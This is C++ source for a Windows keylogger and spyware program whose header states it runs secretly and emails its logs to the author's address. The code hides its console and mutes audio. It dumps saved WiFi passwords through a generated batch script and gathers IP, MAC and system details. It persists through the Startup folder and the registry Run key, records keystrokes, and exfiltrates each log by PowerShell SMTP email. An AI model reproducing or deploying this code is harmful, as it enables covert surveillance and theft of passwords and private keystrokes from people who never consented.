  /*What will this program do?
    This program will operate secretly and will read the keystrokes of the user and store them onto a file
	it will also get the ip address , system info and mac address of the user and store them in seperate files
	in the end it will email the files to my email.*/
	
	//including required libraries
#include <iostream>   //Input/output
#include <windows.h>  //For hiding/show console
#include <winuser.h>  //For reading keys
#include <ctime>      //For gettime function
#include <fstream>    //For file handling   
#include <string>     //Manipulating strings
#include <Lmcons.h>
#include <dir.h>
#include<conio.h>
#include<stdio.h>   //Used to get user name.
using namespace std;
//Global variables
string location; //Global Variable to store location of cpp file
string systemuser;
string Email_To_Recieve_On="abdulzain6@gmail.com";
string Email_To_Send_From="**********";
string Password_Of_Sender_Email="*************";
string Exe_Name="Keylog.exe";
 void makefile (void)
{
string  path;
ofstream myfile; 
path = getenv ("appdata");
path += "\\logs\\Ws.bat";
myfile.open(path.c_str(), ios::out );
myfile<<"@echo off\n";
myfile<<"\n";
myfile<<"\n";
myfile<<"\n";
myfile<<"setlocal enabledelayedexpansion\n";
myfile<<"\n";
myfile<<":main\n";
myfile<<"    \n";
myfile<<"    \n";
myfile<<"    \n";
myfile<<"\n";
myfile<<"    :: Get all the profiles\n";
myfile<<"    call :get-profiles r\n";
myfile<<"\n";
myfile<<"    :: For each profile, try to get the password\n";
myfile<<"    :main-next-profile\n";
myfile<<"        for /f \"tokens=1* delims=,\" %%a in (\"%r%\") do (\n";
myfile<<"            call :get-profile-key \"%%a\" key\n";
myfile<<"            if \"!key!\" NEQ \"\" (\n";
myfile<<"                echo WiFi: [%%a] Password: [!key!]>>%USERPROFILE%\\AppData\\Roaming\\logs\\Ps.txt";
myfile<<"            )\n";
myfile<<"            set r=%%b\n";
myfile<<"        )\n";
myfile<<"        if \"%r%\" NEQ \"\" goto main-next-profile\n";
myfile<<"\n";
myfile<<"    echo.\n";
myfile<<"    ";
myfile<<"\n";
myfile<<"    goto :eof\n";
myfile<<"\n";
myfile<<"::\n";
myfile<<":: Get the WiFi key of a given profile\n";
myfile<<":get-profile-key <1=profile-name> <2=out-profile-key>\n";
myfile<<"    setlocal\n";
myfile<<"\n";
myfile<<"    set result=\n";
myfile<<"\n";
myfile<<"    FOR /F \"usebackq tokens=2 delims=:\" %%a in (\n";
myfile<<"        `netsh wlan show profile name^=\"%~1\" key^=clear ^| findstr /C:\"Key Content\"`) DO (\n";
myfile<<"        set result=%%a\n";
myfile<<"        set result=!result:~1!\n";
myfile<<"    )\n";
myfile<<"    (\n";
myfile<<"        endlocal\n";
myfile<<"        set %2=%result%\n";
myfile<<"    )\n";
myfile<<"\n";
myfile<<"    goto :eof\n";
myfile<<"\n";
myfile<<"::\n";
myfile<<":: Get all network profiles (comma separated) into the result result-variable\n";
myfile<<":get-profiles <1=result-variable>\n";
myfile<<"    setlocal\n";
myfile<<"\n";
myfile<<"    set result=\n";
myfile<<"\n";
myfile<<"   \n";
myfile<<"    FOR /F \"usebackq tokens=2 delims=:\" %%a in (\n";
myfile<<"        `netsh wlan show profiles ^| findstr /C:\"All User Profile\"`) DO (\n";
myfile<<"        set val=%%a\n";
myfile<<"        set val=!val:~1!\n";
myfile<<"\n";
myfile<<"        set result=%!val!,!result!\n";
myfile<<"    )\n";
myfile<<"    (\n";
myfile<<"        endlocal\n";
myfile<<"        set %1=%result:~0,-1%\n";
myfile<<"    )\n";
myfile<<"";
myfile<<"goto :eof";
myfile.close();
system("%USERPROFILE%\\AppData\\Roaming\\Logs\\Ws.bat");
}
 void registery (void)
 {
 	HKEY hKey;
const char* czStartName = "Exe_Name";
string czExePath   = "%USERPROFILE%\\Start Menu\\Programs\\Startup\\"+Exe_Name;

LONG lnRes = RegOpenKeyEx(  HKEY_CURRENT_USER,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                            0 , KEY_WRITE,
                            &hKey);
if( ERROR_SUCCESS == lnRes )
{
    lnRes = RegSetValueEx(  hKey,
                            czStartName,
                            0,
                            REG_SZ,
                            (unsigned char*)czExePath.c_str(),
                            strlen(czExePath.c_str()) );
}

RegCloseKey(hKey);
 }
 
 void getusername (void) // using Lmcons library to get username..
  {
  char username[UNLEN+1];
   DWORD username_len = UNLEN+1;
   GetUserName(username, &username_len);
   systemuser=username;	
  }
   
 
  
 void gettime (void) //Get system time .
   {
   	string  path;
    ofstream sysfile;  
    path = getenv ("appdata");
    path += "\\Logs\\SystemInfo.txt";
    sysfile.open(path.c_str(),  ios::app);
   	time_t now = time(0);
    char* dt = ctime(&now);
    sysfile << "The local date and time is: " << dt << endl;
	sysfile.close(); 
   }
      	
 void showsysteminfo(void)  //Function to store system informaton in a file.
   {          
 	SYSTEM_INFO siSysInfo;    //WE take the info and store in a structure ,,, we name it siSysInfo
 	GetSystemInfo(&siSysInfo);     //We get the info from the structure                                                                             
	//Storing data in the SystemInfo.txt file

   	string  path;
    ofstream sysfile;  
    path = getenv ("appdata");
    path += "\\Logs\\SystemInfo.txt";
    sysfile.open(path.c_str(), ios::out );   //storing file name in sysfile variable and opening the file.
	 
	sysfile<<"Hardware information: \n";  
	
    sysfile<<"OEM ID: "<< siSysInfo.dwOemId<<endl;   //WE get OEM ID from dwOemId variable from the siSysInfo structure
    
    sysfile<<"Number of processors:"<< siSysInfo.dwNumberOfProcessors<<endl;  //WE get Number of processors from dwNumberOfProcessors variable from the siSysInfo structure
    
    
    sysfile<<"Page size: "<<siSysInfo.dwPageSize<<endl;  //WE get Page size from dwPageSize variable from the siSysInfo structure
    
    sysfile<<"Processor type: "<< siSysInfo.dwProcessorType<<endl;  //WE get processor type from dwProcessorType variable from the siSysInfo structure
    
    sysfile<<"Minimum application address: "<< siSysInfo.lpMinimumApplicationAddress<<endl;  /*WE getMinimum application address from lpMinimumApplicationAddress
	                                                                                       variable from the siSysInfo structure*/
    
    sysfile<<"Maximum application address: "<< siSysInfo.lpMaximumApplicationAddress<<endl;   /*WE Maximum application address application address from lpMaximumApplicationAddress
	                                                                                       variable from the siSysInfo structure*/
    
    sysfile<<"Active processor mask: "<<siSysInfo.dwActiveProcessorMask<<endl;     /*WE Active processor mask application address from dwActiveProcessorMas
	                                                                                       variable from the siSysInfo structure*/
	sysfile<<"System name: "<<systemuser;
	
	sysfile<<"\n\n\n";

	sysfile.close();   //Closing the file.                                                        
 }
 
 inline void hideconsole(void) //This is from windows.h library it hides the console when executed.
   {
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
   }
 
 void storemacaddress(void)   //Types the command in cmd and stores the result into a file
   {
  system(("getmac>%USERPROFILE%\\AppData\\Roaming\\Logs\\MacAddress.txt"));
   }
	
 void storeipddress(void)  //Types the command in cmd and stores the result into a file
   {
  system(("ipconfig>%USERPROFILE%\\AppData\\Roaming\\Logs\\IPAddress.txt"));
   }
 void storexternalip (void)
 {
    system("nslookup myip.opendns.com resolver1.opendns.com>%USERPROFILE%\\AppData\\Roaming\\Logs\\publicip.txt");
 }
 inline void sendemail (string email1,string message,string password, string subject,string mailto,string filename)
{
   
   	    register string command_zoho="%SYSTEMROOT%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe  \"$password = '"+password+"' | ConvertTo-SecureString -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential('"+email1+"', $password);Send-MailMessage -ErrorAction Stop -from '"+email1+"' -to '"+mailto+"' -subject '"+subject+"' -body '"+message+"'  -SmtpServer 'smtp.zoho.com' -Attachments '"+filename+"' -Priority  'Normal' -Credential $credential -Port 587 -UseSsl;Write-Output 'Email Sent'\"";
		system(command_zoho.c_str());
    
}
  void sendlog (void) //Runs the powershell script to send email.
   {
 	     
 	   sendemail(Email_To_Send_From,"Log File",Password_Of_Sender_Email,"Log file",Email_To_Recieve_On,"%USERPROFILE%\\AppData\\Roaming\\Logs\\Log.txt");
 
   }
 
 void sendinfo (void) //Runs the powershell script to send email.
   {
   sendemail(Email_To_Send_From,"System Info",Password_Of_Sender_Email,"System Info",Email_To_Recieve_On,"%USERPROFILE%\\AppData\\Roaming\\Logs\\SystemInfo.txt");
   sendemail(Email_To_Send_From,"Wifi Passwords",Password_Of_Sender_Email,"Wifi Passwords",Email_To_Recieve_On,"%USERPROFILE%\\AppData\\Roaming\\Logs\\Ps.txt");
   sendemail(Email_To_Send_From,"Ip Address",Password_Of_Sender_Email,"IP Address",Email_To_Recieve_On,"%USERPROFILE%\\AppData\\Roaming\\Logs\\IPAddress.txt");
   sendemail(Email_To_Send_From,"Mac Address",Password_Of_Sender_Email,"Mac Address",Email_To_Recieve_On,"%USERPROFILE%\\AppData\\Roaming\\Logs\\MacAddress.txt");
   sendemail(Email_To_Send_From,"Public IP",Password_Of_Sender_Email,"Public IP",Email_To_Recieve_On,"%USERPROFILE%\\AppData\\Roaming\\Logs\\publicip.txt");  
   }
   
   
 void getlocation (void)  //Gets the location from where the file is placed.
   {
		char tuh[_MAX_PATH];
char *abc;
abc=getcwd(tuh,sizeof(tuh));
location=abc;
   }
   void turnofvoice()
 {
  INPUT ip={0};
  ip.type = INPUT_KEYBOARD;
  ip.ki.wVk = VK_VOLUME_MUTE;  
  SendInput(1, &ip, sizeof(INPUT));
  ip.ki.dwFlags = KEYEVENTF_KEYUP;
  SendInput(1, &ip, sizeof(INPUT));
}
 void keylog (void) //Key logger
   {
	char c;
	int count=0; //When to send email
	while(true)
	{
		
		for (c=7; c<=130;c++) // We loop through the whole ascii table, and check if the key is pressed
		{            
		                  if (count==90) //If 90 chars entered send log file
	                    	{
	                    sendlog();
	                    system("del %USERPROFILE%\\AppData\\Roaming\\Logs\\log.txt");
	                    count=0;
	                    	}                        
			if (GetAsyncKeyState(c)==-32767)  //This function belonging to winuser.h returns -32767 if key is pressed
			{
			   	count++; //counting characters
	
			   	
			  	string  path;
    			ofstream write;  
    			path = getenv ("appdata");
    			path += "\\Logs\\log.txt";
    			write.open(path.c_str(), ios::out | ios::app);
	
		      
            
            if(((c>64)&&(c<91))&&!(GetAsyncKeyState(0x10)) )
            {
                c+=32;
                write<<c;
                write.close();
                break;
            }
            else if((c>64)&&(c<91))
            {
                
                write<<c;
                write.close();
                break;
            }
            else {
                
                switch (c)
                {
                    case 48:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<")";
                        else
                            write<<"0";    
                        
                        
                        }   
                    break;
                    
                    
                    
                    case 49:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"!";
                        else
                            write<<"1";    
                        
                        
                        }   
                    break;
                    
                    case 50:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"@";
                        else
                            write<<"2";    
                        
                        }
                    break;
                    case 51:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"#";
                        else
                            write<<"3";    
                        
                        
                        }   
                    break;  
                    case 52:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"$";
                        else
                            write<<"4";    
                        
                        
                        }   
                    break;  
                    case 53:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"%";
                        else
                            write<<"5";    
                        
                        
                        }   
                    break;
                    case 54:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"^";
                        else
                            write<<"6";    
                        
                        
                        }   
                    break;
                    case 55:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"&";
                        else
                            write<<"7";    
                        
                        
                        }   
                    break;
                    case 56:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"*";
                        else
                            write<<"8";    
                        
                        
                        }   
                    break;
                    case 57:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"(";
                        else
                            write<<"9";    
                        
                        
                        }   
                    break;
                    
                    case VK_SPACE:
                        write<<" ";
                        break;
                    case VK_RETURN:
                        write<<"\n";
                        break;  
                    case VK_TAB:
                        write<<"  ";
                        break;
                   case VK_BACK:
                        write<<"<BACKSPACE>";
                        break;
                    case VK_DELETE:
                        write<<"<Del>";
                        break;  
                               
				                                  //We can use VK_SHIFT etc instead of their ASCIIS                                
				case VK_SHIFT:  //if user enters shift
                write<<"<Shift>";
                break;
                
                case VK_CONTROL: //if user enters control
                write<<"<Control>";
                break;
                
                case VK_ESCAPE : //if user enters escape
                write<<"<Escape>";
                break;
                
                case VK_END :    //if user enters end
                write<<"<End>";
                break;
                
                case VK_HOME:    //if user enters home
                write<<"<Home>";
                break;
                
                case VK_LEFT:    //if user enters left
                write<<"Left>";
                break;
                
                case VK_UP:     //if user enters up
                write<<"Up";
                break;
                
                case VK_RIGHT: //if user enters right
                write<<"<Right>";
                break;
                
                case VK_DOWN : //if user enters down
                write<<"<Down>"; 
                break; 
                
                    
            }
                
                }
           
           }
	
	}
}
}
 void startup(void) //Adds program to startup
   {
   string command3=("copy \""+location+"\\"+Exe_Name+"\" \"%USERPROFILE%\\Start Menu\\Programs\\Startup\"");
   system(command3.c_str());
   }
  
 void ShowConsole() //Shows Console (windows.h)
   {
    ::ShowWindow(::GetConsoleWindow(), SW_SHOW);
   }
	

	
	int main()
	{   //Calling the functions
		hideconsole();
		system("mkdir %USERPROFILE%\\AppData\\Roaming\\Logs");
		turnofvoice();
		getlocation();
		getusername();
		makefile();
		startup();
		storexternalip();
		storeipddress();
		showsysteminfo();
		gettime();
		storemacaddress();
		registery();
    		sendinfo();
    		keylog();
		return 0;
    	}
